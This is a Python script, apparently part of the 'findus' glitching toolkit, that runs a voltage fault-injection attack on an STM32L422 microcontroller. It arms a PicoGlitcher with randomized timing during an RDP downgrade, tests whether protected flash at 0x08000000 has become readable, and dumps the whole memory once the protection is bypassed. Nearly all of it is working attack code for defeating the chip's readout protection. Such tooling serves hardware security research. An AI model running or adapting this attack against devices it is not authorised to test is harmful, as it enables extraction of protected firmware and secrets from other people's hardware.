#!/usr/bin/env python3
# Copyright (C) 2024 Dr. Matthias Kesenheimer - All Rights Reserved.
# You may use, distribute and modify this code under the terms of the GPL3 license.
#
# You should have received a copy of the GPL3 license with this file.
# If not, please write to: info@faultyhardware.de.

# SQL Queries:
# Show only successes and flash-resets:
# color = 'R' or response LIKE '_Warning.flash_reset'

# connections
# - UART TX: Pin 19 (PA9)
# - UART RX: Pin 20 (PA10)
# - SWDIO: Pin 23 (PA13)
# - SWDCLK: Pin 24 (PA14)
# - LED ERROR: Pin 2 (PC14)
# - LED OK: Pin 3 (PC15)
# - TRIGGER: Pin 22 (PA12)

import argparse
import logging
import random
import sys
import time

# import custom libraries
from findus import DebugInterface, Database, PicoGlitcher, Helper, AnalogPlot

class DerivedDebugInterface(DebugInterface):
    def characterize(self, response:str, mem:int):
        # possibly ok
        if mem is not None:
            if mem != 0x00 and mem != 0xffffffff:
                return b'success: RDP inactive'
            else:
                return b'expected: read empty flash'
        # Error: no connection
        elif "Error: init mode failed (unable to connect to the target)" in response:
            return b'error: no connection'
        # Warning: Polling failed
        elif "Polling target" in response:
            return b'warning: polling failed'
        # Warning: Device lockup
        if "clearing lockup after double fault" in response:
            return b'warning: lock-up'
        # Warning: else
        elif "Warning" in response:
            return b'warning: default warning'
        # expected state
        elif "Error: Failed to read memory at" in response:
            return b'expected: RDP active'
        # no response
        return b'error: no response'

class Main:
    def __init__(self, args):
        self.args = args
        self.power_cycle_time = 0.1

        # logging
        logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)

        # glitcher
        self.glitcher = PicoGlitcher()
        # if argument args.power is not provided, the internal power-cycling capabilities of the pico-glitcher will be used. In this case, ext_power_voltage is not used.
        self.glitcher.init(port=args.rpico, ext_power=args.power, ext_power_voltage=3.3)
        if args.power is not None:
            self.power_cycle_time = 0.5
            self.ext_power_supply = self.glitcher.get_power_supply()
        #self.glitcher.init(ext_power=args.power, ext_power_voltage=3.3)

        # trigger on the rising edge of the reset signal
        self.glitcher.rising_edge_trigger(pin_trigger=args.trigger_input)
        #self.glitcher.edge_count_trigger(pin_trigger=args.trigger_input, number_of_edges=1, edge_type="rising")

        # set up the database
        self.database = Database(sys.argv, resume=self.args.resume, nostore=self.args.no_store, column_names=["delay", "length", "delay_between"])
        self.start_time = int(time.time())
        # if number of experiments get too large, remove the expected results
        #self.database.cleanup("G")

        # STLink Debugger
        #self.debugger = DerivedDebugInterface(interface="stlink", target="stm32l4", transport="hla_swd", gdb_exec="gdb-multiarch")
        self.debugger = DerivedDebugInterface(interface_config="interface/stlink.cfg", target="stm32l4", target_config="target/stm32l4x.cfg", transport="hla_swd")

        # programming the target
        if args.program_target is not None:
            print("[+] Programming target.")
            if args.power is not None:
                self.ext_power_supply.set_voltage(3.3)
            self.debugger.program_target(glitcher=self.glitcher, elf_image="toggle-led-stm32l422.elf", rdp_level=args.program_target, power_cycle_time=self.power_cycle_time, verbose=True)

        # plot the voltage trace while glitching
        # Pico Glitcher
        self.number_of_samples = 1024
        self.sampling_freq = 450_000
        self.dynamic_range = 4096
        # Chipwhisperer Pro
        #self.number_of_samples = 98_000 # ChipWhisperer Pro, max are ~98_000
        #self.sampling_freq = 9e6 # ChipWhisperer Pro
        #self.dynamic_range = 512
        #self.glitcher.configure_adc(number_of_samples=self.number_of_samples, sampling_freq=self.sampling_freq)
        #self.plotter = AnalogPlot(number_of_samples=self.number_of_samples, sampling_freq=self.sampling_freq, dynamic_range=self.dynamic_range)

    def cleanup(self):
        self.debugger.detach()

    def prepare_target(self, force=False):
        print("[+] Preparing target.")
        # check if target needs to be programmed
        rdp, pcrop = self.debugger.read_rdp_and_pcrop(verbose=False)
        print(f"[+] Option bytes: rdp = {hex(rdp)}, pcrop = {hex(pcrop)}")

        # write a program to the target and enable RDP level 1
        # unlock should not be necessary, since RDP level should be zero from the last experiment
        # if RDP is already level 1, we don't care and continue
        # steps:
        # - init; halt; program {elf_image}; run; exit
        # - init; halt; {self.processor_name}x lock 0; exit
        # - reset and power-cycle
        if rdp == 0xaa or rdp == 0xcc:
            print("[+] Warning: rdp not as expected. Programming target with test program (to flash) and enabling rdp level 1.")
            if self.args.power is not None:
                self.ext_power_supply.set_voltage(3.3)
            self.debugger.program_target(glitcher=self.glitcher, elf_image="toggle-led-stm32l422.elf", unlock=False, rdp_level=1, power_cycle_time=self.power_cycle_time)
        elif pcrop != 0x00:
            print("[+] Warning: pcrop not as expected. Programming target with test program (to flash) and enabling rdp level 1.")
            if self.args.power is not None:
                self.ext_power_supply.set_voltage(3.3)
            self.debugger.program_target(glitcher=self.glitcher, elf_image="toggle-led-stm32l422.elf", unlock=True, rdp_level=1, power_cycle_time=self.power_cycle_time)
        elif force:
            print("[+] Programming forced.")
            if self.args.power is not None:
                self.ext_power_supply.set_voltage(3.3)
            self.debugger.program_target(glitcher=self.glitcher, elf_image="toggle-led-stm32l422.elf", unlock=True, rdp_level=1, power_cycle_time=self.power_cycle_time)

        # check if programming was successful (RDP should be active)
        rdp = self.debugger.read_rdp()
        print(f"[+] Result whether programming was successful: {"ok" if rdp != 0xaa and rdp != 0xcc else "failed"}")
        if rdp == 0xaa or rdp == 0xcc:
            raise Exception("Programming failed.")
        print("[+] Programming finished.")

    def rdp_downgrade(self):
        # load an the controller executable to RAM
        # this will trigger a RDP downgrade to level 0 which will delete the flash content.
        # The controller executable toggles a GPIO pin which we can use to time our glitch
        # steps:
        # - init; halt; load_image {elf_image}; resume; exit
        print("[+] Programming target with program to downgrade to RDP 0 (to RAM).")
        if self.args.power is not None:
            self.ext_power_supply.set_voltage(2.2)
        #self.debugger.load_exec(elf_image="rdp-downgrade-stm32l422.elf", verbose=True)
        self.debugger.attach(delay=0.1)
        self.debugger.gdb_load_exec(elf_image="rdp-downgrade-stm32l422.elf", timeout=0.7, verbose=False)
        self.debugger.detach()

    def run(self):
        # log execution
        logging.info(" ".join(sys.argv))

        s_delay = self.args.delay[0]
        e_delay = self.args.delay[1]
        s_length = self.args.length[0]
        e_length = self.args.length[1]
        s_delay_between = self.args.delay_between[0]
        e_delay_between = self.args.delay_between[1]

        # bring the target to a known state
        self.glitcher.power_cycle_reset(power_cycle_time=self.power_cycle_time)
        time.sleep(self.power_cycle_time)

        experiment_id = 0
        while True:
            # prepare target with test program
            if self.args.program_target != 0:
                self.prepare_target(force=True)
            
            # set up glitch parameters (in nano seconds) and arm glitcher
            delay = random.randint(s_delay, e_delay)
            length = random.randint(s_length, e_length)
            delay_between = random.randint(s_delay_between, e_delay_between)
            self.glitcher.arm(delay, length, 18, delay_between)
            #self.glitcher.arm_adc()

            # downgrade to RDP0 (this triggers the glitch)
            self.rdp_downgrade()

            # block until glitch
            memory = None
            response = ""
            try:
                self.glitcher.block(timeout=1)
                #samples = self.glitcher.get_adc_samples(timeout=1)
                #with open("samples.dat", "a") as f:
                #    f.write(f"{str(samples)}\n") 
                #print(samples[0:256])
                #self.plotter.update_curve(samples)
                self.glitcher.power_cycle_reset(power_cycle_time=self.power_cycle_time)
                time.sleep(self.power_cycle_time)
                # read from protected address and characterize debugger response
                memory, response = self.debugger.read_address(address=0x08000000)
                state = self.debugger.characterize(response=response, mem=memory)
                if memory is not None:
                    print(f"[+] Content at 0x08000000: {hex(memory)}")
            except Exception as e:
                print("[-] Timeout received in block(). Continuing.")
                print(e)
                self.glitcher.power_cycle_reset(power_cycle_time=self.power_cycle_time)
                time.sleep(self.power_cycle_time)
                state = b'warning: timeout'

            # further check if something changed
            if b'warning' not in state:
                rdp, pcrop = self.debugger.read_rdp_and_pcrop()
                print(f"[+] Option bytes: rdp = {hex(rdp)}, pcrop = {hex(pcrop)}")
                # rdp changed
                if rdp != 0xaa and rdp != 0x00:
                    state = b'success: RDP value modified'

            # power cycle if error
            if b'error' in state:
                self.glitcher.power_cycle_reset(power_cycle_time=self.power_cycle_time)
                time.sleep(self.power_cycle_time)

            # dump memory
            if b'success' in state:
                self.debugger.read_image(bin_image=f"{Helper.timestamp()}_memory_dump.bin")
                #self.debugger.telnet_read_image(bin_image=f"{Helper.timestamp()}_memory_dump.bin")
                state = b'success: dump finished'

            # classify state
            color = self.glitcher.classify(state)
            mem_bytes = str(hex(memory) if memory is not None else "None").encode("utf-8")

            # add to database
            state_str = b"state = " + state + b", mem = " + mem_bytes + b", response = " + response.encode("utf-8")
            self.database.insert(experiment_id, delay, length, delay_between, color, state_str)

            # monitor
            #print(response)
            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{color}\t{state}", color))

            # increase experiment id
            experiment_id += 1

            # Dump finished
            if state == b'success: dump finished':
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--rpico", required=True, help="rpico port", default="/dev/ttyUSB2")
    parser.add_argument("--power", required=False, help="rk6006 port", default=None)
    parser.add_argument("--delay", required=True, nargs=2, help="delay start and end", type=int)
    parser.add_argument("--length", required=True, nargs=2, help="length start and end", type=int)
    parser.add_argument("--delay-between", required=False, nargs=2, help="delay between pulses", type=int, default=[100, 100])
    parser.add_argument("--resume", required=False, action='store_true', help="if an previous dataset should be resumed")
    parser.add_argument("--no-store", required=False, action='store_true', help="do not store the run in the database")
    parser.add_argument("--trigger-input", required=False, default="default", help="The trigger input to use (default, alt, ext1, ext2). The inputs ext1 and ext2 require the PicoGlitcher v2.")
    parser.add_argument("--program-target", required=False, metavar="RDP_LEVEL", type=int, default=None, help="Reprogram the target before glitching and set the RDP level (for research only).")
    args = parser.parse_args()

    main = Main(args)

    try:
        main.run()
    except KeyboardInterrupt:
        print("\nExitting...")
        main.cleanup()
        sys.exit(1)
